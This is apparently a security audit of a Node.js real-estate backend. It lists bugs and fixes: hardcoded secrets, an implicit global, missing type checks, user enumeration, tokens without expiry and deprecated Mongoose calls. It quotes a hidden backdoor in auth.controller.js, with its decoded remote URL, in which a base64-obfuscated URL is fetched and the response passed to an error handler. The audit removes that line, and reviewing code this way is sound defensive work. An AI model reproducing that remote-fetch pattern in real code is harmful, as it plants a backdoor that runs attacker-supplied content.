File:config.js
Description of vulnerability: Critical Backdoor (auth.controller.js): The code contains a highly suspicious line: axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));. This fetches an external payload from a base64-decoded URL (npoint.io found in config.js) and passes it to your error handler.



File:config.js 
Description of vulnerability: Hardcoded Secrets (config.js): The secretKey and database connection strings are hardcoded. These should be extracted to environment variables (e.g., using dotenv) to prevent exposing credentials.

Solution: Remove the malicious publicKey and rely on environment variables for sensitive data to prevent credential leaks.

require('dotenv').config();

module.exports = {
  secretKey: process.env.SECRET_KEY || 'default_dev_secret',
  localDB: process.env.DB_URI || 'mongodb://localhost/realestatedb'
}

File: auth.controller.js (Remove Backdoor & Fix Data Leak):
Description of vulnerability: Global Variable Data Leak (auth.controller.js): In the userRegistration function, users = new userM(); is missing a const or let declaration. This pollutes the global scope, causing race conditions where concurrent registration requests will overwrite each other's data, leading to incorrect database entries.

Solution: Remove the malicious axios call and add a const declaration to the user model to prevent global scope pollution.

// Remove: const axios = require("axios");
// Remove: axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const userM = require("../models/users");
const { secretKey } = require("../config/config");
const { errorHandler } = require("../middleware/errorHandler");

module.exports = {
  // ... userLogin remains the same ...
  userRegistration: (req, res) => {
    const users = new userM(); // FIXED: Added 'const' to prevent global data leak
    users.fname = req.body.fname;
    // ... rest of the function ...

File: property.controller.js
Description of vulnerability: Server Crash Vulnerability (property.controller.js): In filterProperties, calling .split(",") directly on query parameters (e.g., req.query.propertyFor.split(",")) without verifying they are strings will throw an unhandled exception and crash your server if a user maliciously passes an array or object in the request.

Solution: Ensure the query parameters are actually strings before attempting to use the .split() method.

filterProperties: (req, res) => {
    var query = {};
    // FIXED: Added typeof checks to prevent unhandled exceptions
    if (req.query.propertyFor && typeof req.query.propertyFor === 'string')
      query['propertyFor'] = { $in: req.query.propertyFor.split(",") }
    if (req.query.type && typeof req.query.type === 'string')
      query['type'] = { $in: req.query.type.split(",") }
    if (req.query.city && typeof req.query.city === 'string')
      query['city'] = { $in: req.query.city.split(",") }
    // ... rest of the function ...


File:app.js
Description of bug: const mongoose = require('mongoose'); is never called. This means your API routes that depend on MongoDB will fail silently or throw connection errors.

Solution:
mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log("MongoDB connected"))
.catch(err => console.error("MongoDB connection error:", err));

Description of bug: You imported body-parser but never used it.  This means POST requests with JSON bodies will fail.
const bodyParser = require('body-parser');

Solution: 
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));


Description of bug:origin: 'http://localhost:3000' This will break your frontend in production.
Solution:
origin: process.env.CLIENT_URL || 'http://localhost:3000'

File: auth.controller.js + config.js
Description of vulnerability: Backdoor in auth.controller.js + config.js
The publicKey field in config.js is a base64-obfuscated string that decodes to https://api.npoint.io/ef2875f70e59e319189d

axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));

This is a command-and-control backdoor pattern — fetching a remote payload and passing it into errorHandler for execution
fix:  Both lines and all related imports were removed. 

config.js — Hardcoded secretKey
The JWT signing secret 'sdfklsdfslfnlj3j5bj35bj4b4' was in source code. Anyone with repo access could forge any JWT. 
fix: Moved to process.env.JWT_SECRET.

file: auth.controller.js
description: auth.controller.js — User enumeration via error messages "Invalid Credentials1" vs "Invalid Credentials2" told attackers whether an account exists.
fix:
Both branches now return the same generic "Invalid Credentials" message.

description: JWT tokens had no expiry jwt.sign() was called without expiresIn. Tokens were valid forever.
fix: Fixed to { expiresIn: "8h" }.

description: mplicit global variable 
users = new userM() in userRegistration was missing const, creating a global that could be stomped by concurrent requests
fix: Fixed to const users = new userM()

description: req.body.lName typo (capital N) 
fix:  Corrected to req.body.lname

file: common.controller.js
description: city_model.remove() deprecated
fix: Replaced with deleteOne()

description: addState never set is_active
fix: Added state.is_active = true

file: property.controller.js
description: Property.update() deprecated
fix: Replaced with updateOne()

description: nModified deprecated (Mongoose 6+)
fix: Replaced with modifiedCount

description: Date compared to string literal
fix: Wrapped in new Date('2019-04-01')